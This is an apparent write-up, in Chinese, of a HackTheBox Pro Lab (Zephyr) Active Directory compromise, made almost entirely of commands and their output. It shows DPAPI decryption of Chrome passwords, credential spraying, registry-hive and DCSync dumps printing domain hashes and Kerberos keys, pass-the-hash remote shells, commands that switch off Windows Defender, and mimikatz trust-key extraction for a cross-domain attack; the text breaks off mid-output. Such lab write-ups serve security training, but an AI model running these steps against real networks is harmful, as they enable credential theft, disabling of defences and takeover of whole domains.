+ kali文件解压

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/dpapi]
└─# unzip marcus_chrome_dpapi.zip 
Archive:  marcus_chrome_dpapi.zip
  inflating: Local State             
  inflating: Login Data              
                                                                                                        
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/dpapi]
└─# dir
Local\ State  Login\ Data  marcus_chrome_dpapi.zip
```

### 获取所有 MasterKey 文件
```plain
proxychains -q impacket-smbclient 'zsm.local/jamie:Pass@123@192.168.210.11'

#在 SMB 客户端中：
use C$
cd \Users\marcus\AppData\Roaming\Microsoft\Protect\S-1-5-21-2734290894-461713716-141835440-4102
get 12cc85b6-0387-4828-bf8a-bd1aae9d8640
get 73d24cd0-ac2b-4db4-b36d-13bcda8787e5
get 81feee77-8f66-4aae-b5e5-bf2331cc15d5
get 87b17799-31db-4a08-90d8-5b9bdbe3335a
get aef3be05-3902-4a5b-85e8-c9f835a0494c
get eb3fcd54-5eb6-414e-8061-91ab265fb353
exit
```

```plain
mkdir -p masterkeys
mv 12cc85b6-* 73d24cd0-* 81feee77-* 87b17799-* aef3be05-* eb3fcd54-* masterkeys/
```

### 生成 prekey
```plain
SID="S-1-5-21-2734290894-461713716-141835440-4102"
pypykatz dpapi prekey password "$SID" '!QAZ2wsx' -o prekey.txt
```

### 解密所有 MasterKey
```plain
# 批量解密所有 MasterKey 文件
for f in masterkeys/*; do
    pypykatz dpapi masterkey "$f" prekey.txt
done

# 记录所有解密的 MasterKey：
# 12cc85b6-0387-4828-bf8a-bd1aae9d8640: 9a1d05826ba4996fff4247152075f389a38b0a97f07763dd4adaa99177b4e04c...
# 73d24cd0-ac2b-4db4-b36d-13bcda8787e5: 74867042415148c2ef30d99098fdbb43ea8f9e397af5ebec8f2ffd2b0c597470...
# 81feee77-8f66-4aae-b5e5-bf2331cc15d5: 42a00c15e748f25d5e3ad603d2207a3421c550e8343c7be359b1288c18282bb7...
# 87b17799-31db-4a08-90d8-5b9bdbe3335a: 4d15512bcb5c80cd42bd16abfb312127072d33cd095db6be0e41a1087e6a53b6...
# aef3be05-3902-4a5b-85e8-c9f835a0494c: bab4bb6cb28d8dd5f9c7ffe3a1bb7dd02e7fbc8534e0df6b6102028b2b0b4565...
# eb3fcd54-5eb6-414e-8061-91ab265fb353: cf1735765f159982e2289d1987deac603acd31ebe794f207b44bd16547a98b91...
```

### 创建 MasterKey JSON 文件
```plain
cat > mk_all.json << 'EOF'
{
    "backupkeys": {},
    "masterkeys": {
        "12cc85b6-0387-4828-bf8a-bd1aae9d8640": "9a1d05826ba4996fff4247152075f389a38b0a97f07763dd4adaa99177b4e04cef644b33dc3e4fbc211b6d16d3b343ede06be50f3d89e82d2d5480567d2a8737",
        "73d24cd0-ac2b-4db4-b36d-13bcda8787e5": "74867042415148c2ef30d99098fdbb43ea8f9e397af5ebec8f2ffd2b0c59747094cdb6efb4a5bb3fdc284396e644fc4be37c57aed8ee2393a8e1f128598f3879",
        "81feee77-8f66-4aae-b5e5-bf2331cc15d5": "42a00c15e748f25d5e3ad603d2207a3421c550e8343c7be359b1288c18282bb72e5806ce05cf7274f954a14c4eb0468007bf5292b9a5e20107c5a767e390f252",
        "87b17799-31db-4a08-90d8-5b9bdbe3335a": "4d15512bcb5c80cd42bd16abfb312127072d33cd095db6be0e41a1087e6a53b6bd113d06a450d796c2648aeb32078a8224ebd97192d03c9020ede38e948a93ce",
        "aef3be05-3902-4a5b-85e8-c9f835a0494c": "bab4bb6cb28d8dd5f9c7ffe3a1bb7dd02e7fbc8534e0df6b6102028b2b0b4565562c98a0257f753dbd0ed52c3dc46539b6236c2ffce21e56965bfdfca09367e3",
        "eb3fcd54-5eb6-414e-8061-91ab265fb353": "cf1735765f159982e2289d1987deac603acd31ebe794f207b44bd16547a98b9109671edd73e097fc0cf5c0f339a6027b75f57645ccad332fcb42d530f69ddfdd"
    }
}
EOF
```

### 解密 Chrome 密码
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/dpapi]
└─# pypykatz dpapi chrome mk_all.json "Local State" --logindata "Login Data"

file: Login Data user: melissa pass: b'WinterIsHere2022!' url: https://zephyr.atlassian.htb/
```

得到凭据melissa/WinterIsHere2022!

## netexec-melissa
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q netexec smb 192.168.210.1/24 -u 'melissa' -p 'WinterIsHere2022!' --shares
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\melissa:WinterIsHere2022! STATUS_LOGON_FAILURE
SMB         192.168.210.12  445    ZPH-SVRCA01      [-] zsm.local\melissa:WinterIsHere2022! STATUS_LOGON_FAILURE
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\melissa:WinterIsHere2022! 
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [-] zsm.local\melissa:WinterIsHere2022! STATUS_LOGON_FAILURE
SMB         192.168.210.14  445    ZPH-SVRADFS1     [-] zsm.local\melissa:WinterIsHere2022! STATUS_LOGON_FAILURE
SMB         192.168.210.15  445    ZPH-SVRSQL01     [-] zsm.local\melissa:WinterIsHere2022! STATUS_LOGON_FAILURE
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Enumerated shares
SMB         192.168.210.16  445    ZPH-SVRCDC01     Share           Permissions     Remark
SMB         192.168.210.16  445    ZPH-SVRCDC01     -----           -----------     ------
SMB         192.168.210.16  445    ZPH-SVRCDC01     ADMIN$          READ            Remote Admin
SMB         192.168.210.16  445    ZPH-SVRCDC01     C$              READ,WRITE      Default share
SMB         192.168.210.16  445    ZPH-SVRCDC01     IPC$            READ            Remote IPC
SMB         192.168.210.16  445    ZPH-SVRCDC01     NETLOGON        READ            Logon server share 
SMB         192.168.210.16  445    ZPH-SVRCDC01     SYSVOL          READ            Logon server share 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

melissa用户对域控的C盘具有写入权限

## bloodhound-python
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q bloodhound-python -u 'melissa' -p 'WinterIsHere2022!' -d internal.zsm.local -dc ZPH-SVRCDC01.internal.zsm.local -ns 192.168.210.16 --dns-tcp -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: internal.zsm.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (ZPH-SVRCDC01.internal.zsm.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: ZPH-SVRCDC01.internal.zsm.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ZPH-SVRCDC01.internal.zsm.local
INFO: Connecting to GC LDAP server: zph-svrcdc01.internal.zsm.local
INFO: Found 15 users
INFO: Found 50 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 1 trusts
WARNING: Could not resolve GPO link to cn={D9142E39-E612-4EC3-B060-83969999F418},cn=policies,cn=system,DC=internal,DC=zsm,DC=local
WARNING: Could not resolve GPO link to cn={4F900B40-52A9-4B21-9C19-62A2EE29338C},cn=policies,cn=system,DC=internal,DC=zsm,DC=local
WARNING: Could not resolve GPO link to cn={2232DB5C-25E8-4C20-A2E8-E99E8014F196},cn=policies,cn=system,DC=internal,DC=zsm,DC=local
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: INT-MAINT.internal.zsm.local
INFO: Querying computer: ZSM-SVRCSQL02.internal.zsm.local
INFO: Querying computer: ZPH-SVRCSUP.internal.zsm.local
INFO: Querying computer: ZPH-SVRCDC01.internal.zsm.local
INFO: Querying computer: ZPH-SVRCHR.internal.zsm.local
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.

During handling of the above exception, another exception occurred:

INFO: Done in 01M 46S
INFO: Compressing output into 20260321221353_bloodhound.zip
```

## Bloodhound
`melissa` 在 `192.168.210.16` 可读写 `C$`，并且是`Backup Operators` 组

![](/image/hackthebox-prolabs/Zephyr-22.png)

**Backup Operators** 是 Windows 操作系统中的一个**内置本地用户组**，具有特殊的备份和还原权限。

| **特性** | **说明** |
| :--- | :--- |
| **权限范围** | 可以备份和还原计算机上的所有文件，无论文件权限如何 |
| **安全限制** | 不能更改安全设置、不能安装软件、不能修改系统配置 |
| **适用场景** | 专门用于执行备份任务的服务账户或人员 |


# ZPH-SVRCDC01-192.168.210.16
## 转储本地 hive
### 远程注册表转储：
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q impacket-reg melissa:'WinterIsHere2022!'@192.168.210.16 backup -o 'C:\Windows\SYSVOL\sysvol'                                                             
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\Windows\SYSVOL\sysvol\SAM.save
[*] Saved HKLM\SYSTEM to C:\Windows\SYSVOL\sysvol\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\Windows\SYSVOL\sysvol\SECURITY.save
```

### smbclient
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-smbclient melissa:'WinterIsHere2022!'@192.168.210.16
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# use sysvol
# ls
drw-rw-rw-          0  Sat Mar 21 22:25:02 2026 .
drw-rw-rw-          0  Thu Oct 20 16:03:21 2022 ..
drw-rw-rw-          0  Thu Oct 20 16:03:21 2022 internal.zsm.local
-rw-rw-rw-      28672  Sat Mar 21 22:24:59 2026 SAM.save
-rw-rw-rw-      32768  Sat Mar 21 22:25:02 2026 SECURITY.save
-rw-rw-rw-   13873152  Sat Mar 21 22:25:00 2026 SYSTEM.save
# mget *.save
[*] Downloading SAM.save
[*] Downloading SECURITY.save
[*] Downloading SYSTEM.save
```

### secretsdump解析
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# impacket-secretsdump -system SYSTEM.save -sam SAM.save -security SECURITY.save local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb1223a009047a376c120c3630a0f0e48
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2024-12-12 13:40:03+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:dc66f30d3e8bd48b4bfb9c3f53eb66ebda1edbb7af476a9f7650476edce03326b61fabe212dfd9e6c2e06eaaffcab3c78cfd4f47cd564ef53e8eb5d855f9e998c34c5fabc5e713559e090d6e5dc149a97ed653608d5cd07864d7774f2d766512849d4fafff4030324173ccd8cb8c6a1513a348a337c6d46778e4e37bc2e2c2e369626f1f153bdf391f8c175fdae042537016a2198b8c120c738854c907a1ddddcb88aaa517af97bcee783d1d9a36ddc179f2bb5cc8a336a00863183c96384434bb9a8eee781822f51d2727cd14e3fd0841edfa7004eefa2a8e3327b457f34587642e1e91e79a24590d97b8ad6cb14ee7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf108ba9fcd3554a2abb82ff4a8d29f0679aeaae6
dpapi_userkey:0xe57f2322d588ce987f04d6a3b1bf31cfa35d050a
[*] NL$KM 
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015
[*] Cleaning up... 
```

## 机器用户 DCSync internal.zsm.local
> $MACHINE.ACC 就是 ZPH-SVRCDC01$
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump internal.zsm.local/ZPH-SVRCDC01\$@192.168.210.16 -hashes :d47a6d90e1c5adf4200227514e393948
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
internal.zsm.local\mssql_svc:6101:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Emily:6601:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Laura:6602:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Melissa:6603:aad3b435b51404eeaad3b435b51404ee:184260f5bf16a77d67a9d540fda79495:::
internal.zsm.local\Sarah:6604:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Amy:6605:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Steven:6606:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Malcolm:6607:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Aron:6608:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Matt:6609:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Jamie:6610:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
ZPH-SVRCDC01$:1000:aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948:::
ZPH-SVRCHR$:1601:aad3b435b51404eeaad3b435b51404ee:06e402102d72956c62a63794a999935e:::
ZPH-SVRCSUP$:1602:aad3b435b51404eeaad3b435b51404ee:36e7d551e7cb15ca7dad3fd851fc707f:::
ZSM-SVRCSQL02$:5601:aad3b435b51404eeaad3b435b51404ee:ad854719bbb6fc1664316a14cc6eb88d:::
INT-MAINT$:6102:aad3b435b51404eeaad3b435b51404ee:cca9b0a476598d91ec3f567c468277f1:::
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:be956dd674de41edd244b8489e577460:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fbbb5e79da10a8b4609429942c12329391e4af7213e69560893b81c421375f0b
Administrator:aes128-cts-hmac-sha1-96:1f50b00b725eb4ed09a3def4e75ec9f0
Administrator:des-cbc-md5:439ed652fe5b38ae
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
internal.zsm.local\mssql_svc:aes256-cts-hmac-sha1-96:bea9de16d6775f6ed646cf8e002b2e6845e219f080a709410cb600f909d105ff
internal.zsm.local\mssql_svc:aes128-cts-hmac-sha1-96:4df91cf757b8cb7c5f6e544236293c8d
internal.zsm.local\mssql_svc:des-cbc-md5:5bdf199ee546e6f8
internal.zsm.local\Emily:aes256-cts-hmac-sha1-96:6fac0f47c747960e583ab9cb6d93c31a9425f9a921d246766c2d1a798e10fb56
internal.zsm.local\Emily:aes128-cts-hmac-sha1-96:fbba2f446451e35dd9cbf1d376580e1f
internal.zsm.local\Emily:des-cbc-md5:fd374cc262ec9201
internal.zsm.local\Laura:aes256-cts-hmac-sha1-96:bf6a8feea25df8f1640143c2dc26bc76128748962aef3d5e1c315b8bc7acc8c0
internal.zsm.local\Laura:aes128-cts-hmac-sha1-96:b994efccf32f7827c5ec3a43126a1118
internal.zsm.local\Laura:des-cbc-md5:add68cc23470b0f8
internal.zsm.local\Melissa:aes256-cts-hmac-sha1-96:b09d86e2e6480c2122ee1383f24e592a9642e16470a82bdeb9fff6875d41a922
internal.zsm.local\Melissa:aes128-cts-hmac-sha1-96:289e6d2c65f84c94f185e9755708cf3b
internal.zsm.local\Melissa:des-cbc-md5:982a25f7dc4cb3e9
internal.zsm.local\Sarah:aes256-cts-hmac-sha1-96:81028d54164a46107a6f6b9b0ac9a9216aee0e8d4bce82a3c668d5e1f16774c5
internal.zsm.local\Sarah:aes128-cts-hmac-sha1-96:d130b796b81c66348bc67a95029a19c7
internal.zsm.local\Sarah:des-cbc-md5:29ceaeb664bc2f9e
internal.zsm.local\Amy:aes256-cts-hmac-sha1-96:940adf4174eaaa50218561b87644cdf0210cdecb40ee5b6672312ef39e7f4390
internal.zsm.local\Amy:aes128-cts-hmac-sha1-96:655645f7b62f9d073a00ef7142c8da33
internal.zsm.local\Amy:des-cbc-md5:49e0d6bfd69868b6
internal.zsm.local\Steven:aes256-cts-hmac-sha1-96:9adcb602c37ce0ee4894d74a6575a6f70f7430e8e00446bc0850b787089c4cc4
internal.zsm.local\Steven:aes128-cts-hmac-sha1-96:e9731b435a8651cf11d52d71df936385
internal.zsm.local\Steven:des-cbc-md5:5dce8a52b389e5a2
internal.zsm.local\Malcolm:aes256-cts-hmac-sha1-96:f6e7d8a35afb386c1c271d6a53af85fcf8e306d36f281fdfc2c477c353f62c91
internal.zsm.local\Malcolm:aes128-cts-hmac-sha1-96:4bac2835d8be32ad5dd585ceb7450ef3
internal.zsm.local\Malcolm:des-cbc-md5:26b331256d2fbcd9
internal.zsm.local\Aron:aes256-cts-hmac-sha1-96:957fd600878eaad5dba70443e42d6a647b0b393211da3e62e55ef5bff965d9bb
internal.zsm.local\Aron:aes128-cts-hmac-sha1-96:26ef49f42cb51e023b50c84e360399eb
internal.zsm.local\Aron:des-cbc-md5:91cef44fc119f119
internal.zsm.local\Matt:aes256-cts-hmac-sha1-96:1877cc1d57a84d334b4a07a77c80086dfb76abe997f0339307efb32429b0deee
internal.zsm.local\Matt:aes128-cts-hmac-sha1-96:a4007666551eebd71856c6833faed374
internal.zsm.local\Matt:des-cbc-md5:2a4a5b467f9bb919
internal.zsm.local\Jamie:aes256-cts-hmac-sha1-96:899a0a57d770ad6510608350b67487beb5c50ac8f3455a1804ff4e8eb85da5e8
internal.zsm.local\Jamie:aes128-cts-hmac-sha1-96:abc87732e5844aafab3c8b355076a959
internal.zsm.local\Jamie:des-cbc-md5:5234a7253bd31f98
ZPH-SVRCDC01$:aes256-cts-hmac-sha1-96:8a67907987149e76179c1717526a984b286656ce9c5afae114b11a0e1187d282
ZPH-SVRCDC01$:aes128-cts-hmac-sha1-96:68e66ddb5aaf1e796af831a3a0527699
ZPH-SVRCDC01$:des-cbc-md5:298c2fb6f823790d
ZPH-SVRCHR$:aes256-cts-hmac-sha1-96:9b37dffd2f9e191262978b8a9cc9b41f782165e4f4709973c9e1e5ada5f80e35
ZPH-SVRCHR$:aes128-cts-hmac-sha1-96:cf8f357935397b6fcf7058e751ffd9e6
ZPH-SVRCHR$:des-cbc-md5:4698c19bbaf8b667
ZPH-SVRCSUP$:aes256-cts-hmac-sha1-96:980035e13beb4c1b68e5071f0b919bf1a11b37cf3573e0a88f0305614fb361d3
ZPH-SVRCSUP$:aes128-cts-hmac-sha1-96:a98bbab60af92f6b8ce9d1f93e9a230c
ZPH-SVRCSUP$:des-cbc-md5:ec7acd5d73fb371f
ZSM-SVRCSQL02$:aes256-cts-hmac-sha1-96:1270026132348b974c1a948cd7b202ae9678b5b3b03cdbdb4be825c1c11f4d71
ZSM-SVRCSQL02$:aes128-cts-hmac-sha1-96:5d3e1581bca6b36aac111bb16bc8e2e1
ZSM-SVRCSQL02$:des-cbc-md5:bf8faba8893475a7
INT-MAINT$:aes256-cts-hmac-sha1-96:5222d4a99827d8e10173a6984b94a685f21aed806825e22f08911c45bb5b6512
INT-MAINT$:aes128-cts-hmac-sha1-96:c15805616dc52a7d6a9d7b4bbacb93d0
INT-MAINT$:des-cbc-md5:26df6d5743bc153b
ZSM$:aes256-cts-hmac-sha1-96:f4b591eda59176720e94e594f456c81fdb0d6109606a26fa16036012a101d9c5
ZSM$:aes128-cts-hmac-sha1-96:8a411898f528476b1f27d30d8158c80b
ZSM$:des-cbc-md5:a42f91e6c889e0df
[*] Cleaning up... 
```

## Getflag
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-smbclient \
    -hashes :543beb20a2a579c7714ced68a1760d5e \
    Administrator@192.168.210.16
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use C$
# cd Users\Administrator\Desktop
# get flag.txt
# exit
                                                                                                        
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# cat flag.txt        
ZEPHYR{In73rn4l_D0m41n_D0m1n473d}   
```

## Lookupsid
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q lookupsid.py internal.zsm.local/melissa:'WinterIsHere2022!'@192.168.210.16
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.210.16
[*] StringBinding ncacn_np:192.168.210.16[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3056178012-3972705859-491075245
500: internal\Administrator (SidTypeUser)
501: internal\Guest (SidTypeUser)
502: internal\krbtgt (SidTypeUser)
512: internal\Domain Admins (SidTypeGroup)
513: internal\Domain Users (SidTypeGroup)
514: internal\Domain Guests (SidTypeGroup)
515: internal\Domain Computers (SidTypeGroup)
516: internal\Domain Controllers (SidTypeGroup)
517: internal\Cert Publishers (SidTypeAlias)
520: internal\Group Policy Creator Owners (SidTypeGroup)
521: internal\Read-only Domain Controllers (SidTypeGroup)
522: internal\Cloneable Domain Controllers (SidTypeGroup)
525: internal\Protected Users (SidTypeGroup)
526: internal\Key Admins (SidTypeGroup)
553: internal\RAS and IAS Servers (SidTypeAlias)
571: internal\Allowed RODC Password Replication Group (SidTypeAlias)
572: internal\Denied RODC Password Replication Group (SidTypeAlias)
1000: internal\ZPH-SVRCDC01$ (SidTypeUser)
1101: internal\DnsAdmins (SidTypeAlias)
1102: internal\DnsUpdateProxy (SidTypeGroup)
1103: internal\ZSM$ (SidTypeUser)
1601: internal\ZPH-SVRCHR$ (SidTypeUser)
1602: internal\ZPH-SVRCSUP$ (SidTypeUser)
```

## evil-winrm
> [riley-192.168.110.51](#Alwgb)的隧道并不能访问该IP5985端口
>
> 因此我重新在[192.168.210.13](#Dpnyt)主机上搭建了个隧道
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.210.16 \
  -u Administrator \
  -H 543beb20a2a579c7714ced68a1760d5e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## 关闭防护
```plain
  Set-MpPreference -DisableRealtimeMonitoring $true
  Set-MpPreference -DisableIOAVProtection $true
  Set-MpPreference -DisableScriptScanning $true
  Set-MpPreference -DisableBehaviorMonitoring $true
  powershell -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

## sharphound
### upload
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1
```

### run
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-BloodHound -CollectionMethod All
```

### download
```plain
download 20260322055115_BloodHound.zip
```

## Smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py Administrator@192.168.210.16 -hashes :543beb20a2a579c7714ced68a1760d5e
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

## Wmiexec
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q wmiexec.py Administrator@192.168.210.16 -hashes :543beb20a2a579c7714ced68a1760d5e
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
internal\administrator
```

## 跨域攻击
> 1. internal.zsm.local krbtgt AES256: 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
> 2. internal domain SID: S-1-5-21-3056178012-3972705859-491075245
> 3. zsm.local Domain Admins SID: S-1-5-21-2734290894-461713716-141835440-512
>

### 上传mimikatz
```plain
upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe "C:\Windows\Temp\m.exe"
```

### lsadump::trust
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\Windows\Temp\m.exe "privilege::debug" "lsadump::trust /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::trust /patch

Current domain: INTERNAL.ZSM.LOCAL (internal / S-1-5-21-3056178012-3972705859-491075245)

Domain: ZSM.LOCAL (ZSM / S-1-5-21-2734290894-461713716-141835440)
 [  In ] INTERNAL.ZSM.LOCAL -> ZSM.LOCAL
